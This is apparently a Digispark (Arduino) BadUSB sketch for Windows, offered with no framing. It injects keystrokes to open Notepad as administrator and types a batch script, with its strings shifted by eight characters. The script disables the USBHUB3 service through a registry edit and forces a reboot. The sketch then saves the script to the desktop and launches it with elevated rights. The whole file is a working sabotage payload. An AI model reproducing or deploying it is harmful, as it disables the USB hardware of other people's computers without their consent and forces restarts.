#include <DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(0,0);
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); //Click windows key
    DigiKeyboard.delay(1000);
    String toWrite = "NoTepad"; 
    
      for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); //Write notepad
    DigiKeyboard.delay(400);
    DigiKeyboard.sendKeyStroke(KEY_F10, MOD_SHIFT_LEFT); //Show more options shortcut
    DigiKeyboard.delay(400);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Open as administrator option
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT); //Press alt to show more options in a pop up window
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_T); //Select open notepad as administrator by pressing T
    DigiKeyboard.delay(500);
    toWrite = "@echo off\nseT dir1=HKEY_LOCAL_MACHINE\\SYSTEM";
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); //Write first part of the script
    toWrite = "\\CurrenTConTrolSeT\\Services\\USBHUB3\n";
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); //Write second part of the script
    toWrite = "REG ADD \"%dir1%\" /v \"STarT\" /T REG_DWORD /d ";
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); // Write third part of the script
    DigiKeyboard.sendKeyStroke(KEY_4); 
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.sendKeyStroke(56); // Write slash '/'
    DigiKeyboard.sendKeyStroke(KEY_F);
    toWrite = "\nshuTdown /r /T 5"; 
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); // Write fourth part of the script
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT); // Press alt to choose between options in notepad
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_P); //Open file menu by pressing P
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_S); //Choose save file by pressing S
    DigiKeyboard.delay(100);
    toWrite = "#USBYBY.baT";
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); // Write the name of the file
    DigiKeyboard.sendKeyStroke(KEY_L, MOD_CONTROL_LEFT); // CTRL + L to write target file path
    toWrite = "C:\\Users\\%USERNAME%\\DeskTop\n";
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    } 
    DigiKeyboard.println(toWrite); // Write target file path - in this case destkop
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Save the file
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Close notepad - ALT + F4
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT); // Show destkop - Windows + D
    DigiKeyboard.delay(1300);
    DigiKeyboard.sendKeyStroke(KEY_3,MOD_SHIFT_LEFT); // Write # - SHIFT + 3
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_F10, MOD_SHIFT_LEFT); //Show more options shortcut
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(0x51); // Downward arrow - HID usage table
    DigiKeyboard.sendKeyStroke(0x51); // Downward arrow - HID usage table
    DigiKeyboard.sendKeyStroke(0x51); // Downward arrow - HID usage table
    DigiKeyboard.sendKeyStroke(0x51); // Downward arrow - HID usage table
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Open as administrator option
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT); // Press alt to show more options in a pop up window
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_T); // Confirm to open batch as administrator by pressing T
   
    
}

void loop() {
  // put your main code here, to run repeatedly:

}
